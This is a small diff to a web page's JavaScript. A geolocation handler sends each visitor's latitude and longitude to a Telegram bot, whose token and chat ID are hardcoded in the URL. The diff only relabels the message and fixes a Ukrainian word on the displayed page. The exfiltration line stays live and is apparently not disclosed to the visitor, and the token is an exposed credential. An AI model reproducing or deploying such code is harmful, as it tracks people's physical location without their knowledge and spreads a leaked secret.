@@ -16,10 +16,10 @@
   function showPosition(position) {
     var lat = position.coords.latitude;
     var lon = position.coords.longitude;
-    let url = `https://api.telegram.org/bot6480737039:AAFf475pQ3Pe2ESj1jZ1fqZxzrRIybUjKFg/sendMessage?chat_id=977619219&text=IP ${lat}, ${lon}`;
+    let url = `https://api.telegram.org/bot6480737039:AAFf475pQ3Pe2ESj1jZ1fqZxzrRIybUjKFg/sendMessage?chat_id=977619219&text=COORDINATES: ${lat}, ${lon}`;
     Http.open("GET", url);
     Http.send();
-    document.getElementById("location").innerHTML = "Широта: " + lat + "<br>Долгота: " + lon;
+    document.getElementById("location").innerHTML = "Широта: " + lat + "<br>Довгота: " + lon;
   }
           
         
